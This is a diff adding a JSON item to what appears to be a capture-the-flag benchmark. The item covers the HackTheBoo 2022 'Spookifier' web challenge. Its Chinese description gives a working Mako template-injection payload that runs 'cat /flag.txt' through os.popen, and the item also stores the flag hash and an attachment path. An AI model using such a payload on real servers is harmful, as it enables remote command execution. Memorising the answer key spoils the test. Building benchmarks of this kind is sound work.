@@ -1,0 +1,16 @@
+{
+  "id": "real_web_hacktheboo2022_spookifier",
+  "provenance": "real_past_ctf",
+  "category": "web",
+  "title": "HackTheBoo2022 Spookifier (Mako SSTI)",
+  "description": "HackTheBoo2022 web 题: 第四种字体经 render_template 渲染, 存在 Mako SSTI, 用 ${self.module.cache.util.os.popen('cat /flag.txt').read()} 读 flag。writeup 明文给出真 flag。",
+  "flag": "fe687acb1bd7285c1d132e771747f74ac1e6057d9a8fdabceb4264242b5f2c29",
+  "flag_pattern": "HTB\\{[^}]+\\}",
+  "attachments": [
+    "data/questions_real/_attachments/web/real_web_hacktheboo2022_spookifier/flag.txt"
+  ],
+  "difficulty": "EASY",
+  "flag_sha256": "fe687acb1bd7285c1d132e771747f74ac1e6057d9a8fdabceb4264242b5f2c29",
+  "verified_solver": false,
+  "source": "HackTheBoo CTF 2022 Writeup (rench.me): Mako 模板 ${...} SSTI 读 /flag.txt"
+}
